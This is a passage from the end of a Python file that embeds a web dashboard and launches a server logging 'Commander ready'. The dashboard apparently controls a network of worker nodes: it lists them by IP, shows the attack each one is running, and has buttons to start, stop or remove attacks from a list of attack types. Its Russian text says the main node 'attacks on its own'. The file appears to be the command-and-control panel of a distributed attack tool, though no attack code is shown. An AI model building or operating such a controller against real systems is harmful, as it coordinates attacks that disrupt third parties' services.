      wl.innerHTML = '<span style="color:#333;font-size:11px">Нет дополнительных нод.<br>Главная нода атакует самостоятельно.</span>';
      return;
    }
    const saved = {};
    keys.forEach(ip=>{ const s=document.getElementById('ws-'+ip); if(s) saved[ip]=s.value; });
    wl.innerHTML = keys.map(ip=>{
      const w=d.workers[ip], s=w.status||'checking';
      const name=(w.hostname&&w.hostname!==ip)?w.hostname:ip;
      const sl=w.current_attack?(LABEL[w.current_attack]||w.current_attack):s;
      const sc=w.current_attack?'':'idle';
      const opts=ATK.map(t=>'<option value="'+t+'">'+(LABEL[t]||t)+'</option>').join('');
      return '<div class="witem"><div class="dot '+dotC(s)+'"></div>'
        +'<div class="wname">'+name+'</div>'
        +'<div class="wstate '+sc+'">'+sl+'</div>'
        +'<div class="wa"><select id="ws-'+ip+'" style="margin:0">'+opts+'</select>'
        +'<button class="btn" onclick="runWorker(\''+ip+'\')">▶</button>'
        +'<button class="btn" style="border-color:#333;color:#555" onclick="stopWorker(\''+ip+'\')">■</button>'
        +'<button class="btn" style="border-color:#553;color:#863" onclick="removeWorker(\''+ip+'\')">✕</button>'
        +'</div></div>';
    }).join('');
    keys.forEach(ip=>{ const s=document.getElementById('ws-'+ip); if(s&&saved[ip]) s.value=saved[ip]; });
  } catch(e) {}
}

setInterval(refresh, 3000);
refresh();
</script>
</body>
</html>"""


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Commander ready — http://{my_ip}:{PORT}/ui")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
